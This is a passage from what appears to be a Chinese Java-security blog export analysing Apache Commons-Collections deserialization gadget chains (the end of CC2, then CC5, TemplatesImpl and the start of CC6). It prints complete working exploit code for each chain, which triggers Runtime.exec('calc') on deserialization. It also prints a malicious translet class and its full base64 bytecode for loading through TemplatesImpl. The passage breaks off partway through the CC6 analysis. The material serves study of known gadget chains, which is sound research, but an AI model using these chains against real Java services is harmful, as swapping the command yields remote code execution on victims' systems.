![](https://s3.hedgedoc.org/demo/uploads/e0487b69-45e7-4b66-8716-6516f03ffcb5.png)

好了，这里会调用了成员变量comparator的compare()方法，而成员变量comparator其实就是Comparator对象，所以在反序列化PriorityQueue对象的时候，一定会调用Comparator.compare()方法

我们回到demo

![](https://s3.hedgedoc.org/demo/uploads/7f48b973-8f43-4107-833b-165afa898774.png)

demo中，给PriorityQueue对象的成员变量comparator传入的就是TransformingComparator对象，我们跟进TransformingComparator对象

![](https://s3.hedgedoc.org/demo/uploads/b1242b5c-2e40-4f5f-9957-caa1105ce3ae.png)

它实现了Comparator，说明TransformingComparator对象也是Comparator对象，且它的compare()方法中，传入了两个对象，并分别调用了transformer.transform()方法

上面说到，在反序列化PriorityQueue对象的时候，一定会调用Comparator.compare()方法，而现在PriorityQueue对象中成员变量comparator是TransformingComparator对象，所以一定会调用TransformingComparator对象的compare()方法中的transformer.transform()方法

![](https://s3.hedgedoc.org/demo/uploads/09de6585-c234-46a8-a51e-af41406ea739.png)

此时，transformer就是InvokerTransformer对象，因为demo中，InvokerTransformer对象封装到了TransformingComparator对象里面

![](https://s3.hedgedoc.org/demo/uploads/be54e29d-ce4f-45f1-89e6-2553465c3f31.png)

而InvokerTransformer.transformer()方法传入的Object对象其实来自于PriorityQueue的成员变量queue中

![](https://s3.hedgedoc.org/demo/uploads/323f5104-4607-4936-a755-e08d041f2470.png)

从demo中可以看到，将TemplatesImpl对象先封装到Object数组对象中，然后再将Object数组对象赋值给PriorityQueue的成员变量queue

所以此时的queue的元素是TemplatesImpl对象，即InvokerTransformer.transformer()方法传入的Object对象就是TemplatesImpl对象

![](https://s3.hedgedoc.org/demo/uploads/08139a42-9f04-4c7a-b139-569c49f984b4.png)

而InvokerTransformer.transformer()方法的作用就是调用传如对象的指定方法，需要传入类、指定方法名，指定参数类型、指定参数

![](https://s3.hedgedoc.org/demo/uploads/6282124a-7097-4ac4-962c-4d209240feaa.png)

而指定方法名，指定参数类型、指定参数，在InvokerTransformer的构造函数中赋值，即在实例化InvokerTransformer对象的时候赋值

![](https://s3.hedgedoc.org/demo/uploads/39b14f67-40b4-4bc3-aa0a-e94121c1bd51.png)

这里传入的的方法是newTransformer，而参数类型和参数为空，即调用TemplatesImpl.newTransformer()方法，成功实例化TemplatesImpl对像

然后，在实例化TemplatesImpl的时候，就会触发弹出计算器的命令

完成
## 完整代码
```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2 {

    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String fieldName, Object fieldValue) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object,fieldValue);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","test111");
        setValue(templates,"_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //获取newTransformer方法
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",null, null);

        //TransformingComparator实例，并将InvokerTransformer封装进去
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);

        //获取PriorityQueue实例
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(2);

        //PriorityQueue实例的成员变量赋值
        Object[] objects = new Object[]{templates,templates};
        setValue(priorityQueue,"queue",objects);
        setValue(priorityQueue,"comparator",transformingComparator);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aaa.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(priorityQueue);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aaa.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
效果:

![](https://s3.hedgedoc.org/demo/uploads/ee886726-2775-4f47-aebd-4df5fc691e02.png)

报错，到是不影响我弹计算器

## 学习
https://xz.aliyun.com/t/9409




































]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>6、CC5</title>
    <url>/2023/08/22/6%E3%80%81CC5/</url>
    <content><![CDATA[# CC5
## 利用版本
jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
## 相比其他CC链
其实和CC1-2调用链相似，只不过CC1-2序列化的类是InvocationHandler（AnnotationInvocationHandler），CC5序列化的类是BadAttributeValueExpException，其他的代码都差不多
## CC5 Demo
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException 实例
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }

}

```
## 分析
直接从中间开始分析

![](https://s3.hedgedoc.org/demo/uploads/91ce6c1d-6b8c-408c-9305-730cb05602bc.png)

还是用的LazyMap，那么肯定是通过LazyMap.get()方法触发；接着将LazyMap对象给封装到TiedMapEntry对象中，我们跟进到TiedMapEntry的这个构造方法

![](https://s3.hedgedoc.org/demo/uploads/bc4bf361-f296-4fdf-8e9a-9113a01f082c.png)

构造方法有两个形参，一个是Map对象，一个是Object对象，这个构造方法主要是给成员变量赋值，其中第一个形参Map是LazyMap对象，所以这里的成员变量map就是LazyMap对象

![](https://s3.hedgedoc.org/demo/uploads/67b94a76-56af-4e2f-8876-fecb38da196f.png)

而TiedMapEntry类中的getValue()方法调用了map（LazyMap）的get()方法

![](https://s3.hedgedoc.org/demo/uploads/a508c377-92e6-4d41-9412-0a8795ed25c0.png)

且equals()、hashCode、toString()方法调用了getValue()方法，也就是说这三个方法都会触发LazyMap.get()方法造成命令执行

继续看demo

![](https://s3.hedgedoc.org/demo/uploads/466acd03-3985-41bc-a675-b40e867e33ba.png)

TiedMapEntry对象被封装到了BadAttributeValueExpException对象中，并赋值给BadAttributeValueExpException对象中的成员变量var，最后将BadAttributeValueExpException对象序列化

那么说明，触发点在BadAttributeValueExpException对象中的readObject()方法中，我们跟进BadAttributeValueExpException.readObject()方法

![](https://s3.hedgedoc.org/demo/uploads/3d99d71d-4710-4d72-87bc-94b61feb1b4a.png)

上图中，先从序列化BadAttributeValueExpException对象中获取到成员变量var的值，然后赋值给valObj，接下来再调用valObj的toString()方法，但是要进入valObj.toString()这个代码，valObj不能为空且varObj不能是String类的实例对象

![](https://s3.hedgedoc.org/demo/uploads/8224f9b1-e3c7-466d-8369-1eb50e4fd74d.png)

不过demo中，直接将TiedMapEntry对象赋值给了成员变量var，所以反序列化BadAttributeValueExpException对象时候，valObj是一个TiedMapEntry对象（valObj不能为空且varObj不能是String类的实例对象），那么就会调用TiedMapEntry.toString()方法，同时也会调用了LazyMap.get()方法，弹出计算器
## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException 实例
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(badAttributeValueExpException);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 学习
https://xz.aliyun.com/t/9409



































]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>TemplatesImpl</title>
    <url>/2023/08/22/TemplatesImpl/</url>
    <content><![CDATA[# TemplatesImpl
## 简述
TemplatesImpl这个类不在 Apache Commons Collections 中。但是 TemplatesImpl 这个类很特殊，我们可以借助其动态加载包含恶意的字节码
## 分析
### TemplatesImpl.newTransformer()方法
主要是用来实例化一个TemplatesImpl对象，调用了getTransletInstance()方法，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/422d6e9e-a987-45d2-9db6-d10af1c9e695.png)

 ### TemplatesImpl.getTransletInstance()方法
1. 如果_name=null，就直接返回null，所以_name不能为空
2. 如果_class为null，就去调用defineTransletClasses()方法
3. 然后实例化

这里调用了defineTransletClasses()方法，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/4f49f77b-7f62-4c23-9593-971b7d98d28a.png)

### TemplatesImpl.defineTransletClasses()方法
1. 实例化一个TransletClassLoader对象loader，其中调用了_tfactory.getExternalExtensionsMap()，_tfactory肯定不能为空
2. 调用defineClass()加载_bytecodes
3. 
这里调用了TransletClassLoader类，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/56df4873-c66d-489d-ac76-5a32a1f4fc01.png)

### TemplatesImpl.TransletClassLoader类
其实是TemplatesImpl的一个内部类，它继承ClassLoader父类，重写了defineClass方法

![](https://s3.hedgedoc.org/demo/uploads/da1503f2-f80f-477a-aeb7-29ec31ca8849.png)

### 小结
实例化TemplatesImpl对象，需要给下面的几个成员变量赋值
1. _bytecodes	byte[]对象，字节码，自己定义
2. _name		String对象，类名，随便
3. _tfactory		TransformerFactoryImpl对象，new一个

## 测试
首先准备恶意test类，用于获取恶意字节码
恶意类必须继承AbstractTranslet类

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class test extends AbstractTranslet {
    public test() {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

将恶意类的class文件内容base64编码
https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')

![](https://s3.hedgedoc.org/demo/uploads/6f6d9997-0150-47ec-acdd-f611bc6ec7b8.png)

base64内容：

```
yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj

```

再写一个调用类，负责加载这个恶意字节码

```
import java.lang.reflect.Field;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;

public class test1 {
    
    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String name, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(object,value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
            TemplatesImpl templates = new TemplatesImpl();
            setValue(templates,"_name","test111");
            setValue(templates,"_bytecodes", new byte[][]{code});
            setValue(templates,"_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

效果：报错，但是不影响我弹计算器

![](https://s3.hedgedoc.org/demo/uploads/42b81fd2-eef1-4d5b-b4ee-a5bb1e64b2a3.png)
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>零碎知识</tag>
      </tags>
  </entry>
  <entry>
    <title>7、CC6</title>
    <url>/2023/08/22/7%E3%80%81CC6/</url>
    <content><![CDATA[# CC6
## 利用版本
jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
## CC6 Demo
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        Transformer[] fakeTransformer = new Transformer[]{};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        //先设置假的 Transformer 数组，防止生成时执行命令
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "test");


        //通过反射设置真的 ransformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        //清空由于 hashMap.put 对 LazyMap 造成的影响
        lazyMap.clear();

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }

}

```
## 分析
看demo，其实和CC5差不多，不同就是序列化的对象不一样

![](https://s3.hedgedoc.org/demo/uploads/d462d5f7-2153-483f-9c2e-873718b880f7.png)

![](https://s3.hedgedoc.org/demo/uploads/c8ebde39-5ac3-40ca-88b2-387d840fffd9.png)

相同的是都将LazyMap封装到了TiedMapEntry对象

![](https://s3.hedgedoc.org/demo/uploads/3965a520-65ce-4835-bb05-6e4792d43442.png)

![](https://s3.hedgedoc.org/demo/uploads/9cc60eab-f4e4-4f08-9fd5-d46391e6856e.png)

在CC5的分析文章中分析说到，要触发LazyMap.get()方法，TiedMapEntry有三个方法都可以触发

![](https://s3.hedgedoc.org/demo/uploads/3d3172ad-3436-44c4-b840-f3331874ec00.png)

![](https://s3.hedgedoc.org/demo/uploads/67c3fe03-3508-49b5-a26b-c19ecd852b1f.png)

其中hashCode()方法法跟序列化的HashMap对象有关系，我们跟进HashMap.readObject()方法

![](https://s3.hedgedoc.org/demo/uploads/e55e47da-bd73-46ec-a130-cc3f32855696.png)

跟进hash()

可以看到，在hash()方法中，会调用key.hashCode()

回到demo中，可以看到HashMap对象传入的key是一个TiedMapEntry对象，所以反序列化HashMap对象的时候，就会调用TiedMapEntry.hashCode()方法，进而触发LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/6dd3ef18-b04c-49cd-8169-2b0f576d0415.png)

只要调用了LazyMap.get()，就可以触发ChainedTransformer.transform()，进而对transformers数组进行回调，最后执行命令

但是，调用HashMap.put()方法的时候，也会调用hashCode()方法，这样的话还序列化就直接执行命令了

![](https://s3.hedgedoc.org/demo/uploads/8897cdd0-be24-4838-8799-ca9e2826769a.png)

![](https://s3.hedgedoc.org/demo/uploads/86cee55e-8e8a-4a94-9a43-1ffb0679149c.png)

这样不符合预期，我们需要在反序列化的时候才能触发命令执行，所以代码需要修改一下

如下图所示，另外写一个Transformer数组对象fackTransformers，并且封装到ChainedTransformer对象中，这样在调用HashMap.put()方法的时候就不会触发我们的命令执行了

